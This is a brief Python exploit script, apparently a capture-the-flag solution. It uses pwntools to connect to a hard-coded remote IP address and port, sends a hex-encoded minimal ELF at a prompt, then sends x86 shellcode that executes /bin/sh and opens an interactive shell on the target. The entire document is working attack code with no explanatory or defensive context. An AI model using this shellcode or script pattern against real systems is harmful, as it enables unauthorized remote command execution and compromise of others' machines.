from pwn import *

r = remote('195.201.117.89', 34588)

r.sendlineafter('ELF>', '7f454c4601000000000000000000010002000300200001002000010004000000b00389e189e2cd8054c3200001')

r.sendline('\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\xb0\x0b\xcd\x80')

r.interactive()
